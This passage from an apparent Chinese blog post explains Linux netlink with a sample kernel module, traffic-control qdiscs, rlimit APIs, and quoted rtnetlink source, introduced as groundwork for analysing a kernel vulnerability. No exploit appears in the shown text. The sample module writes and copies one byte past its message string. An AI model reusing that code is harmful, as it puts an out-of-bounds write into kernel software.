class="line">    <span class="built_in">printf</span>(<span class="string">&quot;waiting message from kernel!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)NLMSG_DATA(nlh),<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line">    recvmsg(sock_fd,&amp;msg,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got response: %s\n&quot;</span>,NLMSG_DATA(nlh));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 关闭netlink套接字 */</span></span><br><span class="line">    close(sock_fd);</span><br><span class="line">    <span class="built_in">free</span>(nlh);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内核态</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/skbuff.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/netlink.h&gt;</span> <span class="comment">/*该文头文件里包含了linux/netlink.h，因为我们要用到net/netlink.h中的某些API函数，nlmsg_put()*/</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Koorey King&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">nl_sk</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//向用户空间发送消息的接口</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendnlmsg</span><span class="params">(<span class="keyword">char</span> *message,<span class="keyword">int</span> dstPID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> len = NLMSG_SPACE(MAX_MSGSIZE);</span><br><span class="line">    <span class="keyword">int</span> slen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!message || !nl_sk)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为新的 sk_buffer申请空间</span></span><br><span class="line">    skb = alloc_skb(len, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(!skb)&#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;my_net_link: alloc_skb Error./n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    slen = <span class="built_in">strlen</span>(message)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用nlmsg_put()来设置netlink消息头部</span></span><br><span class="line">    nlh = nlmsg_put(skb, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, MAX_MSGSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置Netlink的控制块</span></span><br><span class="line">    NETLINK_CB(skb).pid = <span class="number">0</span>; <span class="comment">// 消息发送者的id标识，如果是内核发的则置0</span></span><br><span class="line">    NETLINK_CB(skb).dst_group = <span class="number">0</span>; <span class="comment">//如果目的组为内核或某一进程，该字段也置0</span></span><br><span class="line"></span><br><span class="line">    message[slen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(NLMSG_DATA(nlh), message, slen+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过netlink_unicast()将消息发送用户空间由dstPID所指定了进程号的进程</span></span><br><span class="line">    netlink_unicast(nl_sk,skb,dstPID,<span class="number">0</span>);</span><br><span class="line">    printk(<span class="string">&quot;send OK!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nl_data_ready</span> <span class="params">(struct sock *sk, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((skb = skb_dequeue(&amp;sk-&gt;sk_receive_queue)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        nlh = (struct nlmsghdr *)skb-&gt;data;</span><br><span class="line">        printk(<span class="string">&quot;%s: received netlink message payload: %s \n&quot;</span>, __FUNCTION__, (<span class="keyword">char</span>*)NLMSG_DATA(nlh));</span><br><span class="line">        sendnlmsg(<span class="string">&quot;I see you&quot;</span>,nlh-&gt;nlmsg_pid); <span class="comment">//发送者的进程ID我们已经将其存储在了netlink消息头部里的nlmsg_pid字段里，所以这里可以拿来用。</span></span><br><span class="line">        kfree_skb(skb);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;recvied finished!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">myinit_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;my netlink in\n&quot;</span>);</span><br><span class="line">    nl_sk = netlink_kernel_create(NETLINK_TEST,<span class="number">0</span>,nl_data_ready,THIS_MODULE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">mycleanup_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;my netlink out!\n&quot;</span>);</span><br><span class="line">    sock_release(nl_sk-&gt;sk_socket);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(myinit_module);</span><br><span class="line">module_exit(mycleanup_module);</span><br></pre></td></tr></table></figure>

<h3 id="linux流量控制"><a href="#linux流量控制" class="headerlink" title="linux流量控制"></a>linux流量控制</h3><h4 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h4><p>在概念上有了一个大致了解，但不多，在Linux中要实现对数据包接收和发送的这些控制行为，需要使用队列结构来临时保存数据包。在Linux实现中，把这种包括数据结构和算法实现的控制机制抽象为结构<code>队列规程:Queuing discipline</code>，简称为<code>qdisc</code>。<code>qdisc</code>对外暴露两个回调接口<code>enqueue</code>和<code>dequeue</code>分别用于数据包入队和数据包出队，而具体的排队算法实现则在<code>qdisc</code>内部隐藏。不同的<code>qdisc</code>实现在Linux内核中实现为不同的内核模块。</p>
<p><code>qdisc</code>的实现可以非常简单，比如只包含单个队列，数据包先进先出，如: <code>pfifo</code>, 代码位于<code>net/sched/sch_fifo.c</code>。也可以实现相当复杂的调度逻辑。比如，可以根据数据包的属性进行过滤分类，而针对不同的<code>分类:class</code>采用不同的算法来进行处理。<code>class</code>可以理解为<code>qdisc</code>的载体，它还可以包含子类与<code>qdisc</code>。用来实现过滤逻辑的组件叫做<code>filter</code>，也叫做<code>分类器classfier</code>, 它需要挂载在<code>qdisc</code>或者<code>class</code>上。</p>
<p>基于<code>qdisc</code>, <code>class</code>和<code>filter</code>种三元素可以构建出非常复杂的树形<code>qdisc</code>结构，极大扩展流量控制的能力。</p>
<p>对于树形结构的<code>qdisc</code>, 当数据包流程最顶层<code>qdisc</code>时，会层层向下递归进行调用。如，父对象(<code>qdisc/class</code>)的<code>enqueue</code>回调接口被调用时，其上所挂载的所有<code>filter</code>依次被调用，直到一个<code>filter</code>匹配成功。然后将数据包入队到<code>filter</code>所指向的<code>class</code>，具体实现则是调用<code>class</code>所配置的<code>Qdisc</code>的<code>enqueue</code>函数。没有成功匹配<code>filter</code>的数据包分类到默认的<code>class</code>中。</p>
<p><img src="http://just4coding.com/images/2022-08-05/1.png" alt="img"></p>
<h4 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h4><p>详情查看<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoyu_750516366/article/details/121177872">https://blog.csdn.net/xiaoyu_750516366/article/details/121177872</a></p>
<h4 id="系统资源控制"><a href="#系统资源控制" class="headerlink" title="系统资源控制"></a>系统资源控制</h4><p>每一个进程都有自己的一组资源限制，在(*)inux系统中我们可以通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getrlimit</span><span class="params">(<span class="keyword">int</span> resource, struct rlimit *rlim)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setrlimit</span><span class="params">(<span class="keyword">int</span> resource, <span class="keyword">const</span> struct rlimit *rlim)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>resource</strong>：可能的选择有</p>
<p><strong>RLIMIT_AS</strong> //进程的最大虚内存空间，字节为单位。<br><strong>RLIMIT_CORE</strong> //内核转存文件的最大长度。<br><strong>RLIMIT_CPU</strong> //最大允许的CPU使用时间，秒为单位。当进程达到软限制，内核将给其发送SIGXCPU信号，这一信号的默认行为是终止进程的执行。然而，可以捕捉信号，处理句柄可将控制返回给主程序。如果进程继续耗费CPU时间，核心会以每秒一次的频率给其发送SIGXCPU信号，直到达到硬限制，那时将给进程发送 SIGKILL信号终止其执行。<br><strong>RLIMIT_DATA</strong> //进程数据段的最大值。<br><strong>RLIMIT_FSIZE</strong> //进程可建立的文件的最大长度。如果进程试图超出这一限制时，核心会给其发送SIGXFSZ信号，默认情况下将终止进程的执行。<br><strong>RLIMIT_LOCKS</strong> //进程可建立的锁和租赁的最大值。<br><strong>RLIMIT_MEMLOCK</strong> //进程可锁定在内存中的最大数据量，字节为单位。<br><strong>RLIMIT_MSGQUEUE</strong> //进程可为POSIX消息队列分配的最大字节数。<br><strong>RLIMIT_NICE</strong> //进程可通过setpriority() 或 nice()调用设置的最大完美值。<br><strong>RLIMIT_NOFILE</strong> //指定比进程可打开的最大文件描述词大一的值，超出此值，将会产生EMFILE错误。<br><strong>RLIMIT_NPROC</strong> //用户可拥有的最大进程数。<br><strong>RLIMIT_RTPRIO</strong> //进程可通过sched_setscheduler 和 sched_setparam设置的最大实时优先级。<br><strong>RLIMIT_SIGPENDING</strong> //用户可拥有的最大挂起信号数。<br><strong>RLIMIT_STACK</strong> //最大的进程堆栈，以字节为单位。</p>
<p>这2个API来取得和设置资源<br>getrlimit用来取得setrlimit用来设置 这二个参数都需要一个要控制的资源 比如控制CPU、内存、文件描述符个数等等的控制，作为第一个参数传入，第二个参数是一个rlimit的结构体地址（指针），他的结构如下定义：<br>定义放在头文件/usr/include/bits/resource.h中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">     <span class="comment">/* The current (soft) limit.    */</span></span><br><span class="line">     <span class="keyword">rlim_t</span> rlim_cur;</span><br><span class="line">     <span class="comment">/* The hard limit.    */</span></span><br><span class="line">     <span class="keyword">rlim_t</span> rlim_max;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>结构体中 rlim_cur是要取得或设置的资源软限制的值，rlim_max是硬限制<br>这两个值的设置有一个小的约束：<br>1） 任何进程可以将软限制改为小于或等于硬限制<br>2） 任何进程都可以将硬限制降低，但普通用户降低了就无法提高，该值必须等于或大于软限制<br>3） 只有超级用户可以提高硬限制<br>一个无限的限制由常量RLIM_INFINITY指定（The value RLIM_INFINITY denotes no limit on a resource ）</p>
<h2 id="漏洞模块rtnetlink分析"><a href="#漏洞模块rtnetlink分析" class="headerlink" title="漏洞模块rtnetlink分析"></a>漏洞模块rtnetlink分析</h2><p>netlink机制有很多协议，每个协议处理不同的事情，rtnetlink就是netlink的其中一个协议，下面就是netlink协议的一些宏定义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ROUTE        0    <span class="comment">/* Routing/device hook                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_UNUSED        1    <span class="comment">/* Unused number                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_USERSOCK    2    <span class="comment">/* Reserved for user mode socket protocols     */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_FIREWALL    3    <span class="comment">/* Firewalling hook                */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_INET_DIAG    4    <span class="comment">/* INET socket monitoring            */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_NFLOG        5    <span class="comment">/* netfilter/iptables ULOG */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_XFRM        6    <span class="comment">/* ipsec */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_SELINUX        7    <span class="comment">/* SELinux event notifications */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ISCSI        8    <span class="comment">/* Open-iSCSI */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_AUDIT        9    <span class="comment">/* auditing */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_FIB_LOOKUP    10    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_CONNECTOR    11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_NETFILTER    12    <span class="comment">/* netfilter subsystem */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_IP6_FW        13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_DNRTMSG        14    <span class="comment">/* DECnet routing messages */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_KOBJECT_UEVENT    15    <span class="comment">/* Kernel messages to userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_GENERIC        16</span></span><br><span class="line"><span class="comment">/* leave room for NETLINK_DM (DM Events) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_SCSITRANSPORT    18    <span class="comment">/* SCSI Transports */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_ECRYPTFS    19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NETLINK_TEST    20 <span class="comment">/* 用户添加的自定义协议 */</span></span></span><br></pre></td></tr></table></figure>

<p>每种协议处理不同的事情，那rtnetlink是干什么的呢，在我的初步了解中，rtnetlink主要可以更改和获取内核的一些网络配置，比如说网络路由、IP地址、链接参数、邻居设置、排队规则、流量类别和数据包分类器都可以通NETLINK_ROUTE套接字进行控制。</p>
<p>rtnetlink主要由以下消息类型组成</p>
<ul>
<li>RTM_NEWLINK、RTM_DELLINK、RTM_GETLINK创建、删除或获取有关特定网络接口的信息。</li>
<li>RTM_NEWADDR、RTM_DELADDR、RTM_GETADDR添加、删除或接收有关与接口关联的IP地址的信息。</li>
<li>RTM_NEWROUTE、RTM_DELROUTE、RTM_GETROUTE创建、删除或接收有关网络路由的信息。</li>
<li>RTM_NEWNEIGH、RTM_DELNEIGH、RTM_GETNEIGH添加、删除或接收有关邻居表条目的信息（例如，ARP条目）。</li>
<li>RTM_NEWRULE、RTM_DELRULE、RTM_GETRULE添加、删除或检索路由规则。</li>
<li>RTM_NEWQDISC、RTM_DELQDISC、RTM_GETQDISC添加、删除或获取排队规则。</li>
<li>RTM_NEWTCLASS、RTM_DELTCLASS、RTM_GETTCLASS添加、删除或获取流量类别。</li>
<li>RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTER添加、删除或接收有关流量过滤器的信息。</li>
</ul>
<h4 id="rtnetlink相关代码分析"><a href="#rtnetlink相关代码分析" class="headerlink" title="rtnetlink相关代码分析"></a>rtnetlink相关代码分析</h4><p>使用<code>NETLINK_ROUTE</code>就可以和rtnetlink进行通信了，rtnetlink有不同的消息类型，不同的消息类型也有不同的type,所以rtnetlink进行初始化的时候就会针对不同情况注册不同的操作函数。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __init <span class="title">rtnetlink_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (register_pernet_subsys(&amp;rtnetlink_net_ops))</span><br><span class="line">		panic(<span class="string">&quot;rtnetlink_init: cannot initialize rtnetlink\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	register_netdevice_notifier(&amp;rtnetlink_dev_notifier);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETLINK, rtnl_getlink,</span><br><span class="line">		      rtnl_dump_ifinfo, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_SETLINK, rtnl_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWLINK, rtnl_newlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELLINK, rtnl_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETADDR, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETROUTE, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETNETCONF, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWLINKPROP, rtnl_newlinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELLINKPROP, rtnl_dellinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_NEWNEIGH, rtnl_fdb_add, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_DELNEIGH, rtnl_fdb_del, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_GETNEIGH, rtnl_fdb_get, rtnl_fdb_dump, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_GETLINK, <span class="literal">NULL</span>, rtnl_bridge_getlink, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_DELLINK, rtnl_bridge_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_SETLINK, rtnl_bridge_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETSTATS, rtnl_stats_get, rtnl_stats_dump,</span><br><span class="line">		      <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_SETSTATS, rtnl_stats_set, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要就是调用了<code>rtnl_register()</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtnl_register</span><span class="params">(<span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">		   rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = rtnl_register_internal(<span class="literal">NULL</span>, protocol, msgtype, doit, dumpit,</span><br><span class="line">				     flags);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		pr_err(<span class="string">&quot;Unable to register rtnetlink message handler, &quot;</span></span><br><span class="line">		       <span class="string">&quot;protocol = %d, message type = %d\n&quot;</span>, protocol, msgtype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>rtnl_register()</code>函数声明可见不同消息类型的不同type有两种操作，一种是<code>doit</code>,一种是<code>dumpit</code>。有的类型这两种操作都有，有的类型只有一种。</p>
<p>在<code>rtnl_register()</code>函数中又调用了<code>rtnl_register_internal</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnl_register_internal</span><span class="params">(struct <span class="keyword">module</span> *owner,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">				  rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>, *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> __<span class="title">rcu</span> **<span class="title">tab</span>;</span></span><br><span class="line">	<span class="keyword">int</span> msgindex;</span><br><span class="line">	<span class="keyword">int</span> ret = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">	BUG_ON(protocol &lt; <span class="number">0</span> || protocol &gt; RTNL_FAMILY_MAX);</span><br><span class="line">	msgindex = rtm_msgindex(msgtype);</span><br><span class="line"></span><br><span class="line">	rtnl_lock();</span><br><span class="line">	tab = rtnl_dereference(rtnl_msg_handlers[protocol]);</span><br><span class="line">	<span class="keyword">if</span> (tab == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		tab = kcalloc(RTM_NR_MSGTYPES, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!tab)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* ensures we see the 0 stores */</span></span><br><span class="line">		rcu_assign_pointer(rtnl_msg_handlers[protocol], tab);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	old = rtnl_dereference(tab[msgindex]);</span><br><span class="line">	<span class="keyword">if</span> (old) &#123;</span><br><span class="line">		link = kmemdup(old, <span class="keyword">sizeof</span>(*old), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!link)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		link = kzalloc(<span class="keyword">sizeof</span>(*link), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!link)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WARN_ON(link-&gt;owner &amp;&amp; link-&gt;owner != owner);</span><br><span class="line">	